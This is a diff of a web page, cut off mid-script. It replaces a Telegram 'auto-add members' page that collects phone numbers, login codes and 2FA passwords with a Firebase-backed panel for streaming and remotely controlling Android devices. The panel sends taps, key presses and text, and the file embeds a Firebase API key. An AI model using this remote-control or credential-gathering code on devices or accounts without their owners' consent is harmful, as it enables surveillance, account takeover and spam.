@@ -1,727 +1,596 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <title>Remote Device Manager</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Add Account - Auto-Add System</title>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
+    
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
-
-        body {
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            background: #0e1621;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             padding: 20px;
         }
-
-        .login-container {
-            width: 100%;
-            max-width: 420px;
-        }
-
-        .login-card {
-            background: #17212b;
-            border-radius: 24px;
-            padding: 32px;
-            border: 1px solid #2b3945;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-        }
-
-        .header-bar {
+        
+        .container { max-width: 1400px; margin: 0 auto; }
+        
+        .header {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            padding: 20px 30px;
+            border-radius: 15px;
+            margin-bottom: 20px;
             display: flex;
+            justify-content: space-between;
             align-items: center;
-            margin-bottom: 28px;
-            gap: 12px;
+            border: 1px solid rgba(255,255,255,0.2);
         }
-
-        .back-button {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: #242f3d;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        
+        .header h1 { color: white; font-size: 24px; }
+        
+        .status-badge {
+            padding: 8px 16px;
+            border-radius: 20px;
+            background: rgba(255,255,255,0.2);
+            color: white;
+            font-size: 14px;
+        }
+        
+        .status-badge.connected { background: #4CAF50; }
+        .status-badge.disconnected { background: #f44336; }
+        
+        .main-content { display: flex; gap: 20px; }
+        
+        .sidebar {
+            flex: 0 0 350px;
+            background: rgba(255,255,255,0.95);
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        
+        .device-card {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 12px;
+            border: 2px solid transparent;
+            transition: all 0.3s;
             cursor: pointer;
-            color: #8e9fad;
-            transition: all 0.2s;
-            border: none;
-            font-size: 1.2rem;
-            text-decoration: none;
         }
-
-        .back-button:hover {
-            background: #2b3945;
+        
+        .device-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .device-card.online {
+            border-left: 4px solid #4CAF50;
+        }
+        
+        .device-card.offline {
+            border-left: 4px solid #f44336;
+            opacity: 0.6;
+        }
+        
+        .device-card.connected {
+            border: 2px solid #2196F3;
+            background: #e3f2fd;
+        }
+        
+        .device-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        
+        .device-name {
+            font-weight: bold;
+            font-size: 16px;
+            color: #333;
+        }
+        
+        .device-status {
+            font-size: 12px;
+            padding: 4px 8px;
+            border-radius: 12px;
             color: white;
         }
-
-        .header-title {
-            font-size: 1.2rem;
-            font-weight: 600;
-            color: #fff;
+        
+        .device-status.online { background: #4CAF50; }
+        .device-status.offline { background: #f44336; }
+        .device-status.connected-status { background: #2196F3; }
+        
+        .device-info {
+            font-size: 13px;
+            color: #666;
+            margin: 5px 0;
         }
-
-        .server-badge {
-            background: #2b5278;
-            color: #6ab2f2;
-            font-size: 0.7rem;
-            padding: 4px 10px;
-            border-radius: 30px;
-            margin-left: auto;
-        }
-
-        .step-indicator {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 24px;
-        }
-
-        .step-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #2b3945;
-            transition: all 0.3s;
-        }
-
-        .step-dot.active {
-            background: #4c9ce0;
-            width: 24px;
-            border-radius: 4px;
-        }
-
-        .step-dot.done {
-            background: #4c9e4c;
-        }
-
-        .step-title {
-            font-size: 1.5rem;
-            font-weight: 700;
-            margin-bottom: 8px;
-            color: #fff;
-        }
-
-        .step-description {
-            color: #8e9fad;
-            font-size: 0.9rem;
-            margin-bottom: 24px;
-            line-height: 1.5;
-        }
-
-        .input-wrapper {
-            background: #242f3d;
-            border: 1px solid #2b3945;
-            border-radius: 14px;
-            display: flex;
-            align-items: center;
-            overflow: hidden;
-            transition: all 0.2s;
-            margin-bottom: 20px;
-        }
-
-        .input-wrapper:focus-within {
-            border-color: #4c9ce0;
-            box-shadow: 0 0 0 3px rgba(76, 156, 224, 0.15);
-        }
-
-        .input-prefix {
-            padding: 14px 0 14px 18px;
-            color: #4c9ce0;
-            font-weight: 600;
-            font-size: 1rem;
-            background: #1e2a36;
-            border-right: 1px solid #2b3945;
-            min-width: 35px;
-            text-align: center;
-        }
-
-        .form-input {
-            flex: 1;
-            padding: 14px 16px;
-            background: transparent;
+        
+        .btn {
+            padding: 10px 20px;
             border: none;
-            color: #fff;
-            font-size: 1rem;
-            outline: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
-
-        .form-input::placeholder {
-            color: #5d6f7e;
-        }
-
-        .password-input {
+        
+        .btn:hover { transform: translateY(-1px); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        
+        .btn-connect { 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
             width: 100%;
-            padding: 14px 16px;
-            background: #242f3d;
-            border: 1px solid #2b3945;
-            border-radius: 14px;
-            color: #fff;
-            font-size: 1rem;
-            outline: none;
-            transition: all 0.2s;
+            margin-top: 8px;
+        }
+        
+        .btn-disconnect {
+            background: #f44336;
+            color: white;
+            width: 100%;
+            margin-top: 8px;
+        }
+        
+        .btn-control {
+            background: #2196F3;
+            color: white;
+            margin: 5px;
+        }
+        
+        .control-panel {
+            flex: 1;
+            background: rgba(255,255,255,0.95);
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            display: none;
+        }
+        
+        .control-panel.active { display: block; }
+        
+        .no-device-selected {
+            text-align: center;
+            padding: 60px 20px;
+            color: #999;
+        }
+        
+        .screen-container {
+            background: #000;
+            border-radius: 10px;
+            overflow: hidden;
             margin-bottom: 20px;
         }
-
-        .password-input:focus {
-            border-color: #4c9ce0;
-            box-shadow: 0 0 0 3px rgba(76, 156, 224, 0.15);
+        
+        #deviceScreen {
+            width: 100%;
+            max-height: 500px;
+            object-fit: contain;
+            cursor: crosshair;
         }
-
-        .code-container {
+        
+        .control-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .gesture-controls {
+            margin-top: 15px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+        
+        .gesture-buttons {
             display: flex;
             gap: 10px;
-            justify-content: center;
-            margin: 24px 0;
+            margin: 10px 0;
+            flex-wrap: wrap;
         }
-
-        .code-box {
-            width: 55px;
-            height: 65px;
-            background: #242f3d;
-            border: 2px solid #2b3945;
-            border-radius: 14px;
-            color: #fff;
-            font-size: 1.8rem;
-            font-weight: bold;
-            text-align: center;
-            line-height: 61px;
-            transition: all 0.2s;
+        
+        .gesture-btn {
+            padding: 8px 16px;
+            border: 2px solid #667eea;
+            background: white;
+            border-radius: 20px;
             cursor: pointer;
-            user-select: none;
+            transition: all 0.3s;
         }
-
-        .code-box.filled {
-            border-color: #4c9ce0;
-            background: #2b5278;
-            box-shadow: 0 0 12px rgba(76, 156, 224, 0.2);
-        }
-
-        .hidden-input {
-            position: absolute;
-            opacity: 0;
-            width: 0;
-            height: 0;
-            pointer-events: none;
-        }
-
-        .btn {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 14px;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .btn-primary {
-            background: #4c9ce0;
+        
+        .gesture-btn.active {
+            background: #667eea;
             color: white;
         }
-
-        .btn-primary:hover:not(:disabled) {
-            background: #6ab2f2;
-            transform: translateY(-1px);
+        
+        #textInput {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            margin: 10px 0;
         }
-
-        .btn-primary:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
+        
+        .streaming-status {
+            padding: 10px;
+            background: #fff3cd;
+            border-radius: 8px;
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
-
-        .btn-secondary {
-            background: #242f3d;
-            color: #6ab2f2;
-            border: 1px solid #2b3945;
-            margin-top: 10px;
-        }
-
-        .btn-secondary:hover {
-            background: #2b3945;
-        }
-
-        .error-message {
-            background: #4a1e1e;
-            color: #ff6b6b;
-            padding: 12px 16px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            font-size: 0.85rem;
-            display: none;
-            border-left: 3px solid #e04c4c;
-            animation: shake 0.5s ease;
-        }
-
-        .success-message {
-            background: #1e4a2b;
-            color: #4c9e4c;
-            padding: 12px 16px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            font-size: 0.85rem;
-            display: none;
-            border-left: 3px solid #4c9e4c;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-
-        .error-message.show, .success-message.show {
-            display: block;
-        }
-
-        .loading-spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
+        
+        .pulse {
+            width: 10px;
+            height: 10px;
+            background: #ff9800;
             border-radius: 50%;
-            border-top-color: white;
-            animation: spin 0.8s linear infinite;
+            animation: pulse 1.5s infinite;
         }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .success-icon {
-            font-size: 4rem;
-            text-align: center;
-            margin: 20px 0;
-            animation: bounce 1s ease infinite;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .footer-text {
-            text-align: center;
-            margin-top: 20px;
-            color: #5d6f7e;
-            font-size: 0.8rem;
-        }
-
-        @media (max-width: 480px) {
-            .login-card {
-                padding: 24px 20px;
-            }
-            
-            .code-box {
-                width: 50px;
-                height: 55px;
-                font-size: 1.5rem;
-                line-height: 51px;
-            }
-            
-            .code-container {
-                gap: 8px;
-            }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-card">
-            <!-- Page 1: Phone Number -->
-            <div id="page1">
-                <div class="header-bar">
-                    <a href="/dashboard" class="back-button">←</a>
-                    <div class="header-title">Add Account</div>
-                    <div class="server-badge" id="serverBadge">Loading...</div>
-                </div>
-
-                <div class="step-indicator">
-                    <div class="step-dot active" id="dot1"></div>
-                    <div class="step-dot" id="dot2"></div>
-                    <div class="step-dot" id="dot3"></div>
-                </div>
-
-                <div class="step-title">📱 Phone Number</div>
-                <div class="step-description">
-                    Enter your phone number with country code to add a new account to the auto-add system.
-                </div>
-
-                <div class="error-message" id="error1"></div>
-                <div class="success-message" id="success1"></div>
-
-                <div class="input-wrapper">
-                    <span class="input-prefix">+</span>
-                    <input type="tel" class="form-input" id="phone" placeholder="1234567890" inputmode="numeric" autofocus>
-                </div>
-
-                <button class="btn btn-primary" id="sendCodeBtn" onclick="sendCode()">
-                    <span>Send Code</span>
-                </button>
-
-                <div class="footer-text">
-                    The account will be used for auto-adding members
+    <div class="container">
+        <div class="header">
+            <h1>📱 Remote Device Manager</h1>
+            <div>
+                <span class="status-badge disconnected" id="connectionStatus">
+                    🔴 Disconnected
+                </span>
+            </div>
+        </div>
+        
+        <div class="main-content">
+            <!-- Device List Sidebar -->
+            <div class="sidebar">
+                <h2 style="margin-bottom: 20px; color: #333;">📋 Available Devices</h2>
+                <div id="deviceList">
+                    <p style="color: #999; text-align: center; padding: 20px;">
+                        Loading devices...
+                    </p>
                 </div>
             </div>
-
-            <!-- Page 2: Verification Code -->
-            <div id="page2" style="display: none;">
-                <div class="header-bar">
-                    <button class="back-button" onclick="backToPage1()">←</button>
-                    <div class="header-title">Verify Code</div>
-                    <div class="server-badge" id="serverBadge2">Loading...</div>
-                </div>
-
-                <div class="step-indicator">
-                    <div class="step-dot done" id="dot1b"></div>
-                    <div class="step-dot active" id="dot2b"></div>
-                    <div class="step-dot" id="dot3b"></div>
-                </div>
-
-                <div class="step-title">🔐 Verification Code</div>
-                <div class="step-description">
-                    Enter the 5-digit code sent to your Telegram account.
-                </div>
-
-                <div class="error-message" id="error2"></div>
-                <div class="success-message" id="success2"></div>
-
-                <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" pattern="[0-9]*">
-                
-                <div class="code-container" id="codeBoxes" onclick="focusHiddenInput()">
-                    <div class="code-box" id="box1">-</div>
-                    <div class="code-box" id="box2">-</div>
-                    <div class="code-box" id="box3">-</div>
-                    <div class="code-box" id="box4">-</div>
-                    <div class="code-box" id="box5">-</div>
-                </div>
-
-                <div id="passwordGroup" style="display: none;">
-                    <input type="password" class="password-input" id="password" placeholder="Enter your 2FA password">
-                </div>
-
-                <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">
-                    <span>Verify & Add Account</span>
-                </button>
-
-                <button class="btn btn-secondary" onclick="backToPage1()">
-                    ← Back
-                </button>
-            </div>
-
-            <!-- Page 3: Success -->
-            <div id="page3" style="display: none;">
-                <div class="header-bar">
-                    <div class="header-title">Success!</div>
-                </div>
-
-                <div class="step-indicator">
-                    <div class="step-dot done"></div>
-                    <div class="step-dot done"></div>
-                    <div class="step-dot done"></div>
-                </div>
-
-                <div class="success-icon">✅</div>
-                <div class="step-title" style="text-align: center;">Account Added!</div>
-                <div class="step-description" id="successAccountInfo" style="text-align: center;">
-                    Your account has been added successfully.
+            
+            <!-- Control Panel -->
+            <div class="control-panel" id="controlPanel">
+                <div id="noDeviceSelected" class="no-device-selected">
+                    <h2>👈 Select a device to control</h2>
+                    <p>Click on a device from the list</p>
                 </div>
                 
-                <button class="btn btn-primary" onclick="goToAutoAdd()">
-                    ⚙️ Go to Auto-Add Settings
-                </button>
-                
-                <button class="btn btn-secondary" onclick="addAnotherAccount()">
-                    ➕ Add Another Account
-                </button>
-
-                <button class="btn btn-secondary" onclick="goToDashboard()">
-                    📱 Go to Dashboard
-                </button>
+                <div id="deviceControls" style="display: none;">
+                    <h2 id="connectedDeviceName" style="color: #333; margin-bottom: 10px;"></h2>
+                    
+                    <!-- Streaming Controls -->
+                    <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+                        <button class="btn btn-control" onclick="startStreaming()" style="background: #4CAF50;">
+                            ▶ Start Streaming
+                        </button>
+                        <button class="btn btn-control" onclick="stopStreaming()" style="background: #f44336;">
+                            ⏹ Stop Streaming
+                        </button>
+                        <button class="btn btn-disconnect" onclick="disconnectDevice()" style="width: auto; margin: 0;">
+                            🔌 Disconnect
+                        </button>
+                    </div>
+                    
+                    <div class="streaming-status" id="streamingStatus" style="display: none;">
+                        <div class="pulse"></div>
+                        <span>Streaming active...</span>
+                    </div>
+                    
+                    <!-- Screen Display -->
+                    <div class="screen-container">
+                        <img id="deviceScreen" alt="Device Screen" />
+                    </div>
+                    
+                    <!-- Navigation Controls -->
+                    <div class="control-buttons">
+                        <button class="btn btn-control" onclick="sendKey(3)">🏠 Home</button>
+                        <button class="btn btn-control" onclick="sendKey(4)">⬅ Back</button>
+                        <button class="btn btn-control" onclick="sendKey(187)">📋 Recent</button>
+                        <button class="btn btn-control" onclick="sendKey(24)">🔊 Vol+</button>
+                        <button class="btn btn-control" onclick="sendKey(25)">🔉 Vol-</button>
+                        <button class="btn btn-control" onclick="sendKey(26)">🔒 Power</button>
+                    </div>
+                    
+                    <!-- Touch Controls -->
+                    <div class="gesture-controls">
+                        <h3>🖱 Touch Controls</h3>
+                        <div class="gesture-buttons">
+                            <button class="gesture-btn active" onclick="setMode('tap')">👆 Tap</button>
+                            <button class="gesture-btn" onclick="setMode('swipe')">👈 Swipe</button>
+                            <button class="gesture-btn" onclick="setMode('longpress')">⏱ Long Press</button>
+                        </div>
+                        <input type="text" id="textInput" placeholder="Type text and press Enter..." 
+                               onkeypress="if(event.key==='Enter') sendText()">
+                        <button class="btn btn-control" onclick="sendText()">📝 Send Text</button>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
-        // State
-        let currentSessionId = null;
-        let currentPhone = '';
-        let redirectTimer = null;
-        let serverName = 'Server';
-
-        // DOM elements
-        const hiddenInput = document.getElementById('hiddenCodeInput');
-        const boxes = [
-            document.getElementById('box1'),
-            document.getElementById('box2'),
-            document.getElementById('box3'),
-            document.getElementById('box4'),
-            document.getElementById('box5')
-        ];
-
-        // Load server info
-        async function loadServerInfo() {
-            try {
-                const res = await fetch('/api/server-info');
-                const data = await res.json();
-                if (data.success) {
-                    serverName = data.server.name;
-                    document.getElementById('serverBadge').textContent = serverName;
-                    const badge2 = document.getElementById('serverBadge2');
-                    if (badge2) badge2.textContent = serverName;
-                }
-            } catch (err) {
-                console.error('Error loading server info:', err);
-            }
-        }
-
-        // Helper Functions
-        function showError(message, pageNum = 1) {
-            const errorDiv = document.getElementById(`error${pageNum}`);
-            if (errorDiv) {
-                errorDiv.textContent = message;
-                errorDiv.classList.add('show');
-                setTimeout(() => errorDiv.classList.remove('show'), 4000);
-            }
-        }
-
-        function showSuccess(message, pageNum = 1) {
-            const successDiv = document.getElementById(`success${pageNum}`);
-            if (successDiv) {
-                successDiv.textContent = message;
-                successDiv.classList.add('show');
-                setTimeout(() => successDiv.classList.remove('show'), 3000);
-            }
-        }
-
-        function setLoading(button, isLoading) {
-            if (isLoading) {
-                button.disabled = true;
-                button.innerHTML = '<span class="loading-spinner"></span><span>Please wait...</span>';
+        // Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyDMddaD1sSCjzdT0cYlvcSPl8V-vADWLrw",
+            authDomain: "newprooject-c6f66.firebaseapp.com",
+            databaseURL: "https://newprooject-c6f66-default-rtdb.firebaseio.com",
+            projectId: "newprooject-c6f66",
+            storageBucket: "newprooject-c6f66.appspot.com",
+            messagingSenderId: "733557611631",
+            appId: "1:733557611631:web:3cab8af8fa93b1783b019a"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        
+        let selectedDeviceId = null;
+        let gestureMode = 'tap';
+        let screenScaleX = 1;
+        let screenScaleY = 1;
+        let screenListener = null;
+        
+        // Connection status
+        db.ref('.info/connected').on('value', (snap) => {
+            const badge = document.getElementById('connectionStatus');
+            if (snap.val() === true) {
+                badge.textContent = '🟢 Connected to Firebase';
+                badge.className = 'status-badge connected';
             } else {
-                button.disabled = false;
-                const text = button.getAttribute('data-original-text') || 'Submit';
-                button.innerHTML = `<span>${text}</span>`;
+                badge.textContent = '🔴 Disconnected';
+                badge.className = 'status-badge disconnected';
             }
-        }
-
-        function focusHiddenInput() {
-            hiddenInput.focus();
-        }
-
-        function updateCodeBoxes() {
-            const code = hiddenInput.value.replace(/[^0-9]/g, '').slice(0, 5);
-            for (let i = 0; i < 5; i++) {
-                if (i < code.length) {
-                    boxes[i].textContent = code[i];
-                    boxes[i].classList.add('filled');
-                } else {
-                    boxes[i].textContent = '-';
-                    boxes[i].classList.remove('filled');
-                }
-            }
-        }
-
-        hiddenInput.addEventListener('input', updateCodeBoxes);
-
-        // Navigation
-        function backToPage1() {
-            document.getElementById('page1').style.display = 'block';
-            document.getElementById('page2').style.display = 'none';
-            document.getElementById('page3').style.display = 'none';
-            
-            document.getElementById('password').value = '';
-            hiddenInput.value = '';
-            updateCodeBoxes();
-            document.getElementById('phone').focus();
-            currentSessionId = null;
-            currentPhone = '';
-            
-            document.getElementById('passwordGroup').style.display = 'none';
-            
-            if (redirectTimer) clearTimeout(redirectTimer);
-        }
-
-        function goToAutoAdd() {
-            window.location.href = '/auto-add';
-        }
-
-        function goToDashboard() {
-            window.location.href = '/dashboard';
-        }
-
-        function addAnotherAccount() {
-            if (redirectTimer) clearTimeout(redirectTimer);
-            backToPage1();
-        }
-
-        // Save original button text
-        document.querySelectorAll('.btn-primary').forEach(btn => {
-            btn.setAttribute('data-original-text', btn.querySelector('span').textContent);
         });
-
-        // API Calls
-        async function sendCode() {
-            let phoneNumber = document.getElementById('phone').value.trim().replace(/\s+/g, '');
-            
-            if (!phoneNumber) {
-                showError('Please enter your phone number', 1);
-                document.getElementById('phone').focus();
-                return;
-            }
-
-            // Clean phone number
-            phoneNumber = phoneNumber.replace(/[^0-9+]/g, '');
-            if (!phoneNumber.startsWith('+')) {
-                phoneNumber = '+' + phoneNumber;
-            }
-
-            const button = document.getElementById('sendCodeBtn');
-            setLoading(button, true);
-
-            try {
-                const response = await fetch('/api/add-account', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: phoneNumber })
-                });
-
-                const data = await response.json();
-
-                if (data.success) {
-                    currentSessionId = data.session_id;
-                    currentPhone = phoneNumber;
-                    
-                    document.getElementById('page1').style.display = 'none';
-                    document.getElementById('page2').style.display = 'block';
-                    
-                    hiddenInput.value = '';
-                    updateCodeBoxes();
-                    document.getElementById('passwordGroup').style.display = 'none';
-                    document.getElementById('password').value = '';
-                    
-                    setTimeout(() => hiddenInput.focus(), 300);
-                    
-                    showSuccess('Verification code sent! Check your Telegram.', 2);
-                } else {
-                    showError(data.error || 'Failed to send code. Please try again.', 1);
+        
+        // Load devices
+        function loadDevices() {
+            db.ref('devices').on('value', (snapshot) => {
+                const deviceList = document.getElementById('deviceList');
+                deviceList.innerHTML = '';
+                
+                if (!snapshot.exists()) {
+                    deviceList.innerHTML = '<p style="text-align:center;color:#999;">No devices found</p>';
+                    return;
                 }
-            } catch (error) {
-                console.error('Error:', error);
-                showError('Network error. Please check your connection and try again.', 1);
-            } finally {
-                setLoading(button, false);
-            }
-        }
-
-        async function verifyCode() {
-            const code = hiddenInput.value.replace(/[^0-9]/g, '');
-            
-            if (code.length !== 5) {
-                showError('Please enter the complete 5-digit code', 2);
-                hiddenInput.focus();
-                return;
-            }
-
-            const passwordInput = document.getElementById('password');
-            const password = passwordInput.value;
-            const needPassword = document.getElementById('passwordGroup').style.display === 'block';
-
-            if (needPassword && !password) {
-                showError('Please enter your 2FA password', 2);
-                passwordInput.focus();
-                return;
-            }
-
-            const button = document.getElementById('verifyBtn');
-            setLoading(button, true);
-
-            try {
-                const response = await fetch('/api/verify-code', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        code: code,
-                        session_id: currentSessionId,
-                        password: password
-                    })
-                });
-
-                const data = await response.json();
-
-                if (data.success) {
-                    // Show success page
-                    document.getElementById('page2').style.display = 'none';
-                    document.getElementById('page3').style.display = 'block';
+                
+                snapshot.forEach((child) => {
+                    const device = child.val();
+                    const deviceId = child.key;
+                    const isOnline = (Date.now() - device.lastSeen) < 30000;
+                    const isConnected = device.connectionStatus === 'connected';
                     
-                    const accountName = data.account ? data.account.name : 'User';
-                    document.getElementById('successAccountInfo').innerHTML = 
-                        `<strong>${accountName}</strong><br>Phone: ${currentPhone}<br><br>
-                        <span style="color: #8e9fad;">You can now configure auto-add for this account.</span>`;
+                    const card = document.createElement('div');
+                    card.className = `device-card ${isOnline ? 'online' : 'offline'} ${isConnected ? 'connected' : ''}`;
                     
-                    showSuccess('Account added successfully!', 3);
-                    
-                } else if (data.need_password) {
-                    // Show 2FA password field
-                    document.getElementById('passwordGroup').style.display = 'block';
-                    document.getElementById('password').value = '';
-                    document.getElementById('password').focus();
-                    showError('This account has 2FA enabled. Please enter your password.', 2);
-                    
-                } else {
-                    // Show error
-                    showError(data.error || 'Verification failed. Please try again.', 2);
-                    
-                    // Clear code on code errors
-                    if (data.error && data.error.toLowerCase().includes('code')) {
-                        hiddenInput.value = '';
-                        updateCodeBoxes();
-                        hiddenInput.focus();
+                    let statusText = isOnline ? 'Online' : 'Offline';
+                    let statusClass = isOnline ? 'online' : 'offline';
+                    if (isConnected) {
+                        statusText = 'Connected';
+                        statusClass = 'connected-status';
                     }
                     
-                    // Clear password on password errors
-                    if (data.error && data.error.toLowerCase().includes('password')) {
-                        passwordInput.value = '';
-                        passwordInput.focus();
-                    }
+                    card.innerHTML = `
+                        <div class="device-header">
+                            <span class="device-name">📱 ${device.deviceName || 'Unknown'}</span>
+                            <span class="device-status ${statusClass}">${statusText}</span>
+                        </div>
+                        <div class="device-info">
+                            Android ${device.androidVersion || 'N/A'}<br>
+                            Screen: ${device.screenWidth || '?'}×${device.screenHeight || '?'}<br>
+                            Last seen: ${new Date(device.lastSeen).toLocaleTimeString()}
+                        </div>
+                        ${!isConnected ? 
+                            `<button class="btn btn-connect" onclick="connectToDevice('${deviceId}')">
+                                🔗 Connect
+                            </button>` :
+                            `<button class="btn btn-disconnect" onclick="disconnectDevice()">
+                                🔌 Disconnect
+                            </button>`
+                        }
+                    `;
+                    
+                    deviceList.appendChild(card);
+                });
+            });
+        }
+        
+        // Connect to device
+        function connectToDevice(deviceId) {
+            // Set connection request
+            db.ref('devices/' + deviceId + '/connectionRequest').set('connect');
+            
+            // Listen for connection acceptance
+            const connectionRef = db.ref('devices/' + deviceId + '/connectionStatus');
+            connectionRef.on('value', (snapshot) => {
+                if (snapshot.val() === 'connected') {
+                    selectedDeviceId = deviceId;
+                    document.getElementById('controlPanel').classList.add('active');
+                    document.getElementById('noDeviceSelected').style.display = 'none';
+                    document.getElementById('deviceControls').style.display = 'block';
+                    document.getElementById('connectedDeviceName').textContent = 
+                        `Connected to: ${deviceId.substring(0, 8)}...`;
+                    
+                    // Start listening to screen
+                    listenToScreen(deviceId);
+                    
+                    connectionRef.off();
+                    alert('Connected to device!');
                 }
-            } catch (error) {
-                console.error('Error:', error);
-                showError('Network error. Please try again.', 2);
-            } finally {
-                setLoading(button, false);
+            });
+            
+            // Timeout after 10 seconds
+            setTimeout(() => {
+                connectionRef.off();
+                if (!selectedDeviceId) {
+                    alert('Connection timeout. Make sure the device is online.');
+                    db.ref('devices/' + deviceId + '/connectionRequest').remove();
+                }
+            }, 10000);
+        }
+        
+        // Disconnect
+        function disconnectDevice() {
+            if (selectedDeviceId) {
+                db.ref('devices/' + selectedDeviceId + '/connectionRequest').set('disconnect');
+                stopStreaming();
+                
+                if (screenListener) {
+                    db.ref('devices/' + selectedDeviceId + '/screen').off('value', screenListener);
+                }
+                
+                selectedDeviceId = null;
+                document.getElementById('controlPanel').classList.remove('active');
+                document.getElementById('deviceControls').style.display = 'none';
+                document.getElementById('noDeviceSelected').style.display = 'block';
+                document.getElementById('streamingStatus').style.display = 'none';
             }
         }
-
-        // Event listeners
-        document.getElementById('phone').addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9+]/g, '');
+        
+        // Screen streaming
+        function listenToScreen(deviceId) {
+            if (screenListener) {
+                db.ref('devices/' + selectedDeviceId + '/screen').off('value', screenListener);
+            }
+            
+            screenListener = db.ref('devices/' + deviceId + '/screen').on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data && data.image) {
+                    document.getElementById('deviceScreen').src = 'data:image/jpeg;base64,' + data.image;
+                    document.getElementById('streamingStatus').style.display = 'flex';
+                    
+                    if (data.width && data.height) {
+                        const screen = document.getElementById('deviceScreen');
+                        screenScaleX = data.width / screen.clientWidth;
+                        screenScaleY = data.height / screen.clientHeight;
+                    }
+                }
+            });
+        }
+        
+        function startStreaming() {
+            if (selectedDeviceId) {
+                sendCommand({ type: 'start_streaming' });
+            }
+        }
+        
+        function stopStreaming() {
+            if (selectedDeviceId) {
+                sendCommand({ type: 'stop_streaming' });
+                document.getElementById('streamingStatus').style.display = 'none';
+            }
+        }
+        
+        // Send commands
+        function sendCommand(data) {
+            if (!selectedDeviceId) return;
+            db.ref('devices/' + selectedDeviceId + '/commands').push(data);
+        }
+        
+        function sendKey(keyCode) {
+            sendCommand({ type: 'key_event', keyCode: keyCode });
+        }
+        
+        function sendText() {
+            const text = document.getElementById('textInput').value;
+            if (text) {
+                sendCommand({ type: 'text_input', text: text });
+                document.getElementById('textInput').value = '';
+            }
+        }
+        
+        function setMode(mode) {
+            gestureMode = mode;
+            document.querySelectorAll('.gesture-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+        }
+        
+        // Touch handling on screen
+        document.addEventListener('DOMContentLoaded', () => {
+            const screen = document.getElementById('deviceScreen');
+            
+            screen.addEventListener('mousedown', (e) => {
+                if (!selectedDeviceId) return;
+                const rect = screen.getBoundingClientRect();
+                const x = (e.clientX - rect.left) * screenScaleX;
+                const y = (e.clientY - rect.top) * screenScaleY;
+                
+                if (gestureMode === 'tap' || gestureMode === 'longpress') {
+                    sendCommand({ type: 'touch', x: Math.round(x), y: Math.round(y) });
+                }
+                
+                screen.dataset.startX = x;
+                screen.dataset.startY = y;
+            });
+            
+            screen.addEventListener('mouseup', (e) => {
+                if (!selectedDeviceId || gestureMode !== 'swipe') return;
+                const rect = screen.getBoundingClientRect();
